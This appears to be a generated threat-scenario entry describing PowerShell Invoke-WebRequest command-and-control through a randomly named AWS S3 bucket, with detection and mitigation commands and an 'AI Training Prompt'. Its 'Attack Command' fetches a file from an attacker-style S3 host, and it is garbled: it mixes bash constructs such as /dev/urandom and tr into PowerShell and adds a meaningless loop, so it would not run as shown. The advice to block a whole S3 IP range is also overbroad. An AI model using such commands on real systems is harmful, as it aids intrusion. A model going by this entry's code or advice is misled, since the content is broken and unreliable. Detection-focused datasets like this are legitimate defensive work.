---
type: campaign
scenario_id: 363
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using Invoke-WebRequest for C2 via AWS S3 bucket.

## Threat Description
Using Invoke-WebRequest for C2 via AWS S3 bucket.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).s3.amazonaws.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -OutFile C:\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt"
```

## Detection Logic
Monitor Invoke-WebRequest: `wmic process where name='powershell.exe' get commandline | findstr s3.amazonaws.com`; Network traffic: `tshark -Y 'http.host contains s3.amazonaws.com'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block S3 access: `netsh advfirewall firewall add rule name='Block S3' dir=out action=block remoteip=52.216.0.0/15`.

## AI Training Prompt
Train AI to detect Invoke-WebRequest C2 via AWS S3 by analyzing HTTP requests, S3 bucket URLs, and file creation patterns; recommend S3 IP blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
